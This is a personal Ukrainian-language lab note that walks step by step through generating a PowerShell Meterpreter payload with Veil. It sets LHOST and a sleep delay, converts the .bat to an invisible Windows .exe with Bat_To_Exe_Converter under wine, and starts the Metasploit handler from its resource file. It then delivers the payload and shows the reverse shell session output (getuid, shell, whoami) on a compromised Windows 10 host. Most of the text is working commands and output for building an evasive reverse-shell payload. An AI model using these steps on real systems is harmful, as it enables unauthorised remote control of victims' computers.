
1  ----------
2 Звязки : [[попереднє використання msfvenom . генерація корисної нагрузки]] ,[[створення корисного навантаження (корисної нагрузки) з допомогою Msvenom]]
3 Теги :[[Генерація корисної нагрузки PowerShell  з допомогою Veil]]

## коротка інструкція як працювати якщо вже все установлено.

1. запускаю в першому терміналі відкритому на робочому столі veil:

sudo veil
 use 1 
 use 22
 set SLEEP 20

 set LHOST 192.168.0.145 
 generate
 powerpayload

2. в папці B2E яка розташована на робочому столі відкрити термінал і запустити програму для перетворення **bat** файлів в файли **exe**:

 sudo wine "Bat_To_Exe_Converter_(Installer).exe"

заходжу в FILE-> Open -> i в випадаючому списку покажемо шлях до файлу var/lib/veil/output/source/powerpayload1.bat
тицяємо на кореневий розділ ->./ -> var -> lib -> veil -> output -> source -> powerpayload1.bat двічі клікнувши побачимо код нашої корисної нагрузки.

зліва буде панель де можна вибрати oпції . наприклад задати іконку, установити парроль чи змінити робочий каталог. але зараз цього не роблю. 
а от у вкладці Exe-Format вибираю 64 бітну невидиму (invisible) машину віндовс 
Kоли все налаштовуємо то переходимо у вкладку **Converter** 

заходжу в FILE-> Open -> i в випадаючому списку покажемо шлях до файлу var/lib/veil/output/source/powerpayload1.bat , даю назву файлу (pspayload) 

pspayload

і зберігаю. файл зберігся  
[08:58:46 AM] 	Filename: Z:\var\lib\veil\output\source\pspayload.exe

3. корисна нагрузка згенерувалась по шляху (з робочого столу) File System -> var -> lib ->veil -> output -> source -> pspayload.exe     Доставляю її на робочий стіл цільової машини (віндовс)

4. Перевірити чи працює корисна нагрузка:
запустити в терміналі де виконувалося конвертація консоль мс:

msfconsole
набираю :
resource
і додаю весь шлях до файлу русурсів метасплоїту  /var/lib/veil/output/handlers/powerpayload.rc  (беру з першого терміналу)
ось такий вигляд має мати  команда :
resource  /var/lib/veil/output/handlers/powerpayload.rc 

це автоматично встановлює прослуховувач цієї корисної нагрузки

5. Виконуємо корисну нагрузку на цільовій машині.
6. Через 20 сек(був установлений сліп) в терміналі калі можна тобачити установлену сесію з цільовою машиною. 
вводжу команду:

sessions -i 1
далі відкриється метерпретер і вньому :

getuid (отримати ідентифікатор користувача)
заходжу в оболонку :
shell
і запитую хто я :
whoami
і бачу що я обліковий запис(тобто машина зломана):
desktop-k5ftq86\woshe







________________________________________

Veil треба установляти в терміналі
sudo apt-get install veil 
далі:
veil
 і тицяти далі далі на спливаючих вікнах 
запускається **sudo** :
sudo veil
ось такий вигляд у консолі:
 1)      Evasion   в перекладі ВІДХИЛЕННЯ
        2)      Ordnance в перекладі ТАЇНСТВО
при використанні просто до use додаємо номер 1 чи 2 або оба разом
якщо набрати ^
Veil>: use 1 
то появиться 41 корисна нагрузка яка читається командою :
list
 Required Options:
                                                                                      
Name                    Value           Description
----                    -----           -----------
BADMACS                 FALSE           Checks for known bad mac addresses
DOMAIN                  X               Optional: Required internal domain
HOSTNAME                X               Optional: Required system hostname
LHOST                                   IP of the Metasploit handler
LPORT                   4444            Port of the Metasploit handler
MINBROWSERS             FALSE           Minimum of 2 browsers
MINPROCESSES            X               Minimum number of processes running
MINRAM                  FALSE           Require a minimum of 3 gigs of RAM
PROCESSORS              X               Optional: Minimum number of processors
SLEEP                   X               Optional: Sleep "Y" seconds, check if accelerated
USERNAME                X               Optional: The required user account
USERPROMPT              FALSE           Window pops up prior to payload
UTCCHECK                FALSE           Check that system isn't using UTC time zone
VIRTUALPROC             FALSE           Check for known VM processes


вибираю корисне навантаження номер 22 :
use 22
і  вона предоставляє всі параметри які можна встановити для цієї корисної нагрузки

установлю затримку після виконання корисної нагрузки:
set SLEEP 20
потрібно ще установити LHOST:
set LHOST 192.168.0.145 
потім даємо команду згенерувати :
generate
отримуємо :
Please enter the base name for output files (default is payload): (ввести базове імя для вихідних файлів). Вводимо ;
powerpayload

серед іншого що виведеться в терміналі нас цікавить вихідний код який розміщено по шляху :
[*] Source code written to: /var/lib/veil/output/source/powerpayload1.bat
йoго треба перетворити в .exe   :
зайти в Firefox і набрати інструмент для перетворення **bat** файлів в файли **exe**
bat2exe B2E github
копіювати інструмент https://github.com/tokyoneon/B2E/blob/master/Bat_To_Exe_Converter.zip і розпакувати його в новому терміналі  відкритому на робочому столі 
/Desktop]
└─$ git clone https://github.com/tokyoneon/B2E 
git clone https://github.com/tokyoneon/B2E 
далі переходимо в каталог:
cd B2E/  
ls
і розпаковуємо зіп файл :
(kali㉿kali)-[~/Desktop/B2E]
└─$ unzip Bat_To_Exe_Converter.zip  
unzip Bat_To_Exe_Converter.zip 
ввівши комардуl ls:
ls
ми отримуємо файл .exe. щоб запустити команду віндовс в калі лінукс ми раніше установили програму wine. тому скористаємось нею:

wine Bat_To_Exe_Converter_\(Installer\).exe 

далі підтверджуємо все по інсталяції.
після інсталяції відкриється вікно конвертера, в яке потрібно помістити згенерований файл  **/var/lib/veil/output/source/powerpayload1.bat**
для цього заходжу в FILE-> Open -> i в випадаючому списку покажемо шлях до файлу var/lib/veil/output/source/powerpayload1.bat
тицяємо на кореневий розділ ->./ -> var -> lib -> veil -> output -> source -> powerpayload1.bat двічі клікнувши побачимо код нашої корисної нагрузки.

зліва буде панель де можна вибрати oпції . наприклад задати іконку, установити парроль чи змінити робочий каталог. але зараз цього не роблю. 
а от у вкладці Exe-Format вибираю 64 бітну невидиму (invisible) машину віндовс 
Лоли все налаштовуємо то переходимо у вкладку **Converter** 

заходжу в FILE-> Open -> i в випадаючому списку покажемо шлях до файлу var/lib/veil/output/source/powerpayload1.bat


[*] Metasploit Resource file written to: /var/lib/veil/output/handlers/powerpayload1.rc 

 і далі працюю в вінді;
*] Meterpreter session 1 opened (192.168.0.109:4444 -> 192.168.0.108:49771) at 2025-04-19 12:15:34 +0200
sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: DESKTOP-K5FTQ86\woshe
meterpreter > shell
Process 6408 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.5737]
(c) ��௮���?� ����������. ��? �� ����饭?.

C:\Users\woshe\OneDrive\����稩 �⮫>whoami
whoami
desktop-k5ftq86\woshe

C:\Users\woshe\OneDrive\����稩 �⮫>

щоб подивитися файли використовую:
dir
cd щоб перейти кудись.


кіно:
https://www.youtube.com/watch?v=pyOYzDZ9es0&list=PLrNhNTukZ_nF4GlvuniZJGC5cdfYDI0z7&index=67